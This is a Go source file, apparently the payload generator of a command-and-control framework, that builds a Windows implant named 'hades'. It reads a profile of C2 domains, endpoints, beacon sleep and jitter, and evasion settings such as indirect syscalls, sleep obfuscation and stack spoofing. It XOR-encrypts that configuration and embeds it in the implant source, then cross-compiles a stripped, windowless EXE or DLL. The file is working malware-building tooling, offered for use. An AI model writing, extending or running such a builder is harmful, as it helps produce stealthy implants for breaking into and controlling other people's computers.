package payloadgen

// this file wll be changed alot as the implant grows
// right now its the bare minimum for testing


import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"unicode/utf16"

	"gopkg.in/yaml.v3"
)

type Domain struct {
	Host  string `yaml:"host"`
	Port  int    `yaml:"port"`
	HTTPS bool   `yaml:"https"`
}

type Endpoints struct {
	Get  string `yaml:"get"`
	Post string `yaml:"post"`
}

type Sleep struct {
	Interval int `yaml:"interval"`
	Jitter   int `yaml:"jitter"`
}

type Obfuscation struct {
	Syscall    string `yaml:"syscall"`
	Heap       bool   `yaml:"heap"`
	SleepObf   bool   `yaml:"sleep"`
	StackSpoof bool   `yaml:"stack_spoof"`
}

type Header struct {
	Key   string `yaml:"key"`
	Value string `yaml:"value"`
}

type Profile struct {
	Domains     []Domain          `yaml:"domains"`
	Endpoints   Endpoints         `yaml:"endpoints"`
	Headers     []Header          `yaml:"headers"`
	Sleep       Sleep             `yaml:"sleep"`
	Obfuscation Obfuscation       `yaml:"obfuscation"`
}


func LoadProfile() (*Profile, error) {
	home, _ := os.UserHomeDir()
	path := filepath.Join(home, ".kronos", "profile.yaml")

	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var prof Profile
	err = yaml.Unmarshal(data, &prof)
	if err != nil {
		return nil, err
	}

	return &prof, nil

}


func longestDomain(domains []Domain) int {
	longest := 0
	for _, entry := range domains {
		l := MultiByteLength(entry.Host)
		if l > longest {
			longest = l
		}
	}
	return longest
}

func MultiByteLength(val string) int {
	return len(utf16.Encode([]rune(val))) + 1
}


func writeU32(buf *bytes.Buffer, val uint32) {
	binary.Write(buf, binary.LittleEndian, val)
}

func writeString(buf *bytes.Buffer, s string) {
	writeU32(buf, uint32(len(s)+1))
	buf.WriteString(s)
	buf.WriteByte(0)
}

func syscallTypeToInt(s string) uint32 {
	switch strings.ToLower(s) {
	case "direct":
		return 1
	case "indirect":
		return 2
	default:
		return 0
	}
}

func boolToU32(b bool) uint32 {
	if b {
		return 1
	}
	return 0
}

func buildHeaderString(headers []Header) string {
	var sb strings.Builder
	for _, h := range headers {
		sb.WriteString(h.Key)
		sb.WriteString(": ")
		sb.WriteString(h.Value)
		sb.WriteString("\r\n")
	}
	sb.WriteString("\r\n")
	return sb.String()
}

func CraftProfileBytes(prof *Profile) ([]byte, error) {
	buf := new(bytes.Buffer)

	writeU32(buf, uint32(len(prof.Domains)))
	for _, d := range prof.Domains {
		writeString(buf, d.Host)
		writeU32(buf, uint32(d.Port))
		writeU32(buf, boolToU32(d.HTTPS))
	}

	writeString(buf, prof.Endpoints.Get)
	writeString(buf, prof.Endpoints.Post)

	headerStr := buildHeaderString(prof.Headers)
	writeString(buf, headerStr)

	writeU32(buf, uint32(prof.Sleep.Interval))
	writeU32(buf, uint32(prof.Sleep.Jitter))

	writeU32(buf, syscallTypeToInt(prof.Obfuscation.Syscall))
	writeU32(buf, boolToU32(prof.Obfuscation.Heap))
	writeU32(buf, boolToU32(prof.Obfuscation.SleepObf))

	profile := buf.Bytes()

	var key [4]byte
	rand.Read(key[:])

	for i := range profile {
		profile[i] ^= key[i%4]
	}

	out := new(bytes.Buffer)
	out.Write(key[:])
	out.Write(profile)

	return out.Bytes(), nil
}

func UpdateConfigSource(prof *Profile, profileData []byte) error {
	home, _ := os.UserHomeDir()
	base := filepath.Join(home, ".kronos", "payload", "implant", "hades")
	tmplPath := filepath.Join(base, "config.hpp.tmpl")
	outPath := filepath.Join(base, "config.hpp")

	content, err := os.ReadFile(tmplPath)
	if err != nil {
		return err
	}

	domainCount := len(prof.Domains)
	domainBufLen := longestDomain(prof.Domains)
	getLen := MultiByteLength(prof.Endpoints.Get)
	postLen := MultiByteLength(prof.Endpoints.Post)
	headerStr := buildHeaderString(prof.Headers)
	headersLen := MultiByteLength(headerStr)

	result := string(content)
	result = strings.Replace(result, "REPLACE_COUNT_MARKER", fmt.Sprintf("%d", domainCount), 1)
	result = strings.Replace(result, "REPLACE_LEN_MARKER", fmt.Sprintf("%d", domainBufLen), 1)
	result = strings.Replace(result, "REPLACE_GET_MARKER", fmt.Sprintf("%d", getLen), 1)
	result = strings.Replace(result, "REPLACE_POST_MARKER", fmt.Sprintf("%d", postLen), 1)
	result = strings.Replace(result, "REPLACE_HEADER_LEN_MARKER", fmt.Sprintf("%d", headersLen), 1)

	profileHex := formatBytesAsHex(profileData)
	result = strings.Replace(result, `"REPLACE_PROFILE_DATA_MARKER"`, profileHex, 1)
	result = strings.Replace(result, "REPLACE_PROF_LEN_MARKER", fmt.Sprintf("%d", len(profileData)), 1)

	return os.WriteFile(outPath, []byte(result), 0644)
}

func formatBytesAsHex(data []byte) string {
	var sb strings.Builder
	sb.WriteByte('"')
	for _, b := range data {
		fmt.Fprintf(&sb, "\\x%02x", b)
	}
	sb.WriteByte('"')
	return sb.String()
}

func GenerateProfile() error {
	prof, err := LoadProfile()
	if err != nil {
		return fmt.Errorf("failed loading config: %w", err)
	}

	profileData, err := CraftProfileBytes(prof)
	if err != nil {
		return fmt.Errorf("failed crafting profile: %w", err)
	}

	return UpdateConfigSource(prof, profileData)
}


func Compile(name, format string, debug bool) (string, error) {
	home, _ := os.UserHomeDir()
	srcDir := filepath.Join(home, ".kronos", "payload", "implant")
	buildDir := filepath.Join(home, ".kronos", "builds")

	if err := os.MkdirAll(buildDir, 0700); err != nil {
		return "", err
	}

	outPath := filepath.Join(buildDir, fmt.Sprintf("%s.%s", name, format))

	args := []string{
		"x86_64-w64-mingw32-c++",
		"-o", outPath,
		"main.cpp",
		"hades/hades.cpp",
		"hades/init.cpp",
		"hades/config.cpp",
		"utils/utils.cpp",
		"utils/bytes.cpp",
		"utils/api.cpp",
		"fileops/files.cpp",
		"cmds/cmds.cpp",
		"networkd/network.cpp",
		"-I", ".",
		"-static", "-std=c++17",
	}

	switch format {
	case "dll":
		args = append(args, "-shared", "-DBUILD_DLL", "-lkernel32")
	default:
		args = append(args, "-DBUILD_EXE", "-lkernel32", "-lmsvcrt")
	}

	if debug {
		args = append(args, "-D_DEBUG", "-O0")
	} else {
		args = append(args, "-O2", "-s", "-mwindows")
	}

	cmd := exec.Command(args[0], args[1:]...)
	cmd.Dir = srcDir

	output, err := cmd.CombinedOutput()
	if err != nil {
		logPath := filepath.Join(srcDir, "error.log")
		os.WriteFile(logPath, output, 0644)
		return "", fmt.Errorf("compilation failed, see %s", logPath)
	}

	return outPath, nil
}